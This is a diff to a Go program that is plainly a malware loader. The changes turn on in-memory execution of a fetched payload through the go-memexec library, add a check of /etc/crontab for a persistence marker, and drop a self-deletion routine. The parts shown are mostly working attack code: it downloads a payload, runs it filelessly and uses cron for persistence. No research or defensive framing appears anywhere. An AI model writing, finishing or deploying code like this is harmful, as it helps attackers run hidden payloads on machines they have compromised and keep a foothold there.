@@ -1,10 +1,12 @@
 package main
 
 import (
+	"bufio"
 	"fmt"
 	"io"
 	"net/http"
 	"os"
+	"strings"
 	"time"
 
 	"github.com/amenzhinsky/go-memexec"
@@ -25,9 +27,20 @@ func main() {
 		time.Sleep(time.Minute)
 	}
 	fetch_payload()
-	// go deploy(PAYLOAD)
-	// time.Sleep(30*time.Second)
-	clean_up()
+	go deploy(PAYLOAD)
+}
+
+func has_persisted() bool {
+	flag := "alpha"
+	file, _ := os.Open("/etc/crontab")
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		line := scanner.Text()
+		if strings.Contains(line, flag) {
+			return true
+		}
+	}
+	return false
 }
 
 func persist() {
@@ -49,13 +62,7 @@ func fetch_payload() {
 	PAYLOAD = bytes
 }
 
-func deploy(path string) {
+func deploy(payload []byte) {
 	exe, _ := memexec.New(PAYLOAD)
 	exe.Command().Run()
-}
-
-func clean_up() {
-	path, _ := os.Executable()
-	fmt.Println(path)
-	os.Remove(path)
 }
